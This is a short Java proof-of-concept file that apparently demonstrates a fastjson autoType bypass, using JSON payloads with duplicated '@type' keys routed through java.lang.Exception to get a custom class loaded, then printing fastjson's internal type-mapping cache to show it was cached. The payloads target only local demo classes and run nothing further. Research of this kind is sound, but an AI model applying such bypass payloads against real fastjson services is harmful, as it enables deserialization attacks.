package com.github.enokiy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.util.TypeUtils;

import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentMap;

public class VulException extends Exception {
    private User user;

    public VulException() {
        System.out.println("VulException default constructor is called");
    }

    public void setUser(User user) {
        this.user = user;
    }

    /**
     *
     */
    public static void main(String[] args) {
//        String poc1 = "{\"b\":{\n" +
//                "\t  \"@type\":\"com.github.enokiy.User\",\n" +
//                "\t  \"@type\":\"com.github.enokiy.Employee\",\n" +
//                "\t  \"name\":\"enokiy\",\n" +
//                "\t  \"eid\":\"1234567\"\n" +
//                "\t}} ";
//        System.out.println(JSON.parseObject(poc1));

        String poc4 = "{\n" +
                "  \"a\":{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "\t\"@type\":\"com.github.enokiy.VulException\",\n" +
                "\t\"user\":{}\n" +
                "  },\n" +
                "  \"b\":{\n" +
                "\t  \"@type\":\"com.github.enokiy.User\",\n" +
                "\t  \"@type\":\"com.github.enokiy.Employee\",\n" +
                "\t  \"name\":\"enokiy\",\n" +
                "\t  \"eid\":\"1234567\"\n" +
                "\t}  \n" +
                "}";


        try {
            System.out.println(JSON.parseObject(poc4));

            Field mappings = TypeUtils.class.getDeclaredField("mappings");
            mappings.setAccessible(true);
            ConcurrentMap<String, Class<?>> o = (ConcurrentMap<String, Class<?>>) mappings.get(TypeUtils.class);
            System.out.println("----------------");
            o.forEach((k, v) -> {
                System.out.println(k);
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}